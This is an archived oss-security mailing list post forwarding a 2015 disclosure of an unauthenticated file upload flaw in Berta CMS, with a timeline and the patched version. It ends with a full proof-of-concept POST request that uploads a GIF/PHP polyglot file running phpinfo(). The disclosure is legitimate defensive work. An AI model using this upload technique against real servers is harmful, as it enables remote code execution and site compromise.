@@ -1,0 +1,195 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>oss-security - Fwd: Insecure file upload in Berta CMS</title>
+
+<link href="/style.css" type="text/css" rel="stylesheet">
+<style type="text/css">
+.calendar { text-align: center; }
+.ccell { background: #ccc; width: 5ex; padding: 2px; }
+
+.cal_brief { text-align: center; }
+.cal_brief td:first-child { background: inherit; }
+.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
+.cal_big { text-align: center; padding: 0; margin: 0; }
+.cal_big td { padding: 0 2px; }
+.cal_mon { text-align: center; }
+.cal_mon th { font-size: small; padding: 0; margin: 0; }
+.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
+	padding: 2px; text-align: right; }
+.cal_mon td[colspan] { background: inherit; }
+.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
+	margin-top: -2pt; font-weight: bold; }
+.cal_mon a { text-align: right; margin-left: -4em; float: right; }
+</style>
+</head>
+
+<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">
+
+
+<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+
+<td>
+<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
+<td width="100%">
+<div class="nav">
+<ul>
+<li><a href="/">Products</a>
+<ul>
+<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
+<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
+<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
+<ul>
+<li><a href="/john/">Free &amp; Open Source for any platform</a>
+<li><a href="/john/cloud/">in the cloud</a>
+<li><a href="/john/pro/linux/">Pro for Linux</a>
+<li><a href="/john/pro/macosx/">Pro for macOS</a>
+</ul>
+<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
+<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
+<ul>
+<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
+<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
+</ul>
+<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
+<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
+<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
+<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
+<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
+<li><a href="/pam/">Pluggable Authentication Modules</a>
+<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
+<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
+<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
+<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
+<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
+</ul>
+<li><a href="/services/">Services</a>
+<li id="narrow-li-1"><a>Publications</a>
+<ul>
+<li><a href="/articles/">Articles</a>
+<li><a href="/presentations/">Presentations</a>
+</ul>
+<li><a>Resources</a>
+<ul>
+<li><a href="/lists/">Mailing lists</a>
+<li><a href="https://openwall.info/wiki/">Community wiki</a>
+<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
+<li><a href="/mirrors/">File archive &amp; mirrors</a>
+<li><a href="/signatures/">How to verify digital signatures</a>
+<li><a href="/ove/">OVE IDs</a>
+</ul>
+<li id="last-li"><a href="/news">What's new</a>
+</ul>
+</div>
+
+
+</table>
+
+
+<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
+<TR><TD>
+<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
+<TR><TD bgcolor="#ECF8FF">
+<a href="https://twitter.com/openwall">
+Follow @Openwall on Twitter for new release announcements and other news</a>
+
+</TABLE>
+</TABLE>
+
+<a href="6">[&lt;prev]</a> <a href="8">[next&gt;]</a> <a href="../../../2015/03/28/4">[thread-next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
+<pre style="white-space: pre-wrap">
+Message-Id: &lt;C6303836-0701-4577-A248-53800051FE45&#64;surevine.com&gt;
+Date: Fri, 27 Mar 2015 10:18:34 +0000
+From: Simon Waters &lt;simon.waters&#64;...evine.com&gt;
+To: oss-security&#64;...ts.openwall.com
+Subject: Fwd: Insecure file upload in Berta CMS
+
+Can a CVE id be allocated for this?
+
+
+&gt; Begin forwarded message:
+&gt; 
+&gt; From: Simon Waters &lt;simon.waters&#64;...evine.com&gt;
+&gt; Subject: Insecure file upload in Berta CMS
+&gt; Date: 26 March 2015 18:01:09 GMT
+&gt; To: bugtraq&#64;...urityfocus.com, fulldisclosure&#64;...lists.org
+&gt; 
+&gt; Berta CMS is a web based content management system using PHP and local file storage.
+&gt; 
+&gt; <a href="http://www.berta.me/" rel="nofollow">http://www.berta.me/</a>
+&gt; 
+&gt; Due to use of a 3rd party Berta CMS website to redirect links within a phishing email brought to our attention we checked the file upload functionality of this software.
+&gt; 
+&gt; We found that the file upload didn't require authentication.
+&gt; 
+&gt; Images with a ".php" extension could be uploaded, and all that was required is that they pass the PHP getimagesize() function and have suitable dimensions.
+&gt; 
+&gt; It is possible for GIF image files (and possibly other image files - not tested) to contain arbitrary PHP whilst being well enough formed to pass the getimagesize() function with acceptable dimensions.
+&gt; 
+&gt; <a href="http://ha.ckers.org/blog/20070604/passing-malicious-php-through-getimagesize/" rel="nofollow">http://ha.ckers.org/blog/20070604/passing-malicious-php-through-getimagesize/</a> &lt;<a href="http://ha.ckers.org/blog/20070604/passing-malicious-php-through-getimagesize/" rel="nofollow">http://ha.ckers.org/blog/20070604/passing-malicious-php-through-getimagesize/</a>&gt;
+&gt; 
+&gt; We can't ascertain if this is the weakness that was used to compromise the 3rd party server in question, however the patch requires authentication for all file uploads, which will likely resolve any similar issues.
+&gt; 
+&gt; The author was notified: 2015-03-22
+&gt; Author Acknowledge: 2015-03-23
+&gt; Patch released: 2015-03-26
+&gt; 
+&gt; The berta-0.8.10b.zip file from: <a href="http://www.berta.me/download/" rel="nofollow">http://www.berta.me/download/</a>  includes a fix that requires authentication to upload files.
+&gt; 
+&gt; 
+&gt; This announcement should not be interpreted as implying either the author, or Surevine, have conducted any in-depth assessment of the suitability of Berta CMS for any purpose (Sometimes you just want to make life harder for those sending phishing emails).
+&gt; 
+&gt; 
+&gt; The following POST request will upload a c.php file which will run phpinfo() when fetched on vulnerable servers.
+&gt; 
+&gt; POST /engine/upload.php?entry=true&amp;mediafolder=.all HTTP/1.1
+&gt; Host: 192.168.56.101
+&gt; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:36.0) Gecko/20100101 Firefox/36.0
+&gt; Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+&gt; Accept-Language: en-US,en;q=0.5
+&gt; Accept-Encoding: gzip, deflate
+&gt; Referer: <a href="http://192.168.56.101/upload.html" rel="nofollow">http://192.168.56.101/upload.html</a>
+&gt; Connection: keep-alive
+&gt; Content-Type: multipart/form-data; boundary=---------------------------2147563051636691175750543802
+&gt; Content-Length: 1617
+&gt; 
+&gt; -----------------------------2147563051636691175750543802
+&gt; Content-Disposition: form-data; name="Filedata"; filename="c.php"
+&gt; Content-Type: text/php
+&gt; 
+&gt; GIF89/* &lt; ³ ÿÿÿfffÌÌÌ333Ìÿÿ™™™3ffÌÌÿÌÿÌ™™Ìf3f 33 f™™3 3 3!þ GIF SmartSaver Ver1.1a , È &lt; þ ÈI«½8ëÍ»ÿ`(Ždižhª®lë¾p,Ïtmßx®ï|ïÿÀ p¸ È¤r™$ö˜ 4ê¬Z¯Õ cËíz¿`n { „ 2-xLn»ßé³|Î`« ¼^O6‡ãkp‚ƒ„#jtˆ]v)~`}g€_‹…”••‡‰‰“' _ 1˜Š–¤¥‚¢™s›&amp; ^ŸŽ¡a«¦´µ?¨©g³$­]¯ž± ¶ÃÄ&lt;¸¹Âw X½\‘^»ÅÒÓ+ÇÈÐ,Í[Ô%ÇÑÜàá)ÖßÙËâ Þèëì'äeç MÌJ êíøùöº x{{ üý P€‚64 
+&gt; ðVpÃ@&gt; 8PƒÄ3 R±pOŸÇ þ ÞU8˜!@˜ (SbL9 a “š6Z8·° É 03 )¡#ÈŸøD Œ÷òäµI ¬ qY RN›D $½Æ€§O XÅ	 p §Qd‹
+&gt; P­s c˜® &amp;’y5«Ûi[ÓF ð´‹R~ ÄŽ%Û4 Z {·. Ðö­a[q¥Î•P—Ë]Yy o™„.mc/*ål,|¸3©Ä )\fðX˜d.L+Ç“Ã Àh¾ 8{žM ôb×'‡‚**GãEŒ Tï&gt;ØºgnãÉh+/d{·…Ñƒ¹FU;ñ9ë	‰Xv} A/¬Ø —‹ Ôü»u0Ñå:g. Ãëôªxv-À’å¬®²Çë'R ˜Wôº™þ' f XCÅuýÜÆ ~áíç ý¹âÞqê	xÐ7Þ}ÑP{	®ç Ö„Ôàƒ$
+&gt; ¡/ (Ýz zQÜLááÕ¡€ ý6‡ˆÉ•¨c ':“â é)¶ w Ý &lt;­H£A5å‚£$;FÉ£ŒJúw Z	žŠ -ƒ$ ¡Iõ "Ob#å™8ô¸Í ˜e)a™vu@ä— „6f"pŠ æž5¨‰Ð XVù&amp;r v	
+&gt; 3jy'ž„šÉç£/øY …B
+&gt; h¤œ^ž f&lt;‹’FP‹(n	%¤¤² )›q
+&gt; *{\j0§¦už *f;©ê£¨Ž–ª«	§ Ú¦­kÒ¥`ž‚
+&gt; k¢oZÓ ²¡þæ·ë³ ôzå¯ j9ë /º9*/&lt;?php phpinfo(); ?&gt;/*
+&gt; `ÇŽ´Ìµ°U .±áBkî&gt;#VëE’ ¦ªîª• Šj v«­ £í ¹åœë/®¹¾‹ Æ;h»6 D ·`°k0ŠÇ H¡³ÿú› ÃòN n Äñf/¹¤a÷±ÀkFÜ ‡ WlîÅÊÊ4f c¶Q s´6 ¢ˆz Ê1/RÇ¯Ê@Wpñ ™É ³&amp;¸ ­Ç]Aæ|ïš¯ñ n± O ôÕ o+îi! † ¥!"“ÓÀ"4õ ¥—2Ö¤^ óX0wÊ†Z™´F6É rÝuÖV³­²Û Ò óÔzâ Hqw?|kà‚ÿìwÅnóýUÆ’k­øá‡e |ùŸ•£7šã [L%G‚ãA©á}‹–Ku™7¼éza q- k‡Žfä¬†·¯¯£ŽÔé² $nç Àk vº¶'o D(åá°&lt;
+&gt; éQ€ `£` q}FÙ*ïý÷à‡/þøä—oþùè§¯þúì·ïþûðÇ/ÿüô×oÿýøç¯ÿþü÷ïÿÿ . ;
+&gt; 
+&gt; -----------------------------2147563051636691175750543802
+&gt; Content-Disposition: form-data; name="submit"
+&gt; 
+&gt; Upload Image
+&gt; -----------------------------2147563051636691175750543802--
+
+</pre>
+<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>
+
+
+<p>
+Please check out the
+<a href="https://oss-security.openwall.org/wiki/">
+Open Source Software Security Wiki</a>, which is counterpart to this
+<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
+<p>
+Confused about <a href="/lists/">mailing lists</a> and their use?
+<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
+and check out these
+<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
+<p>
+
+</body>
+</html>
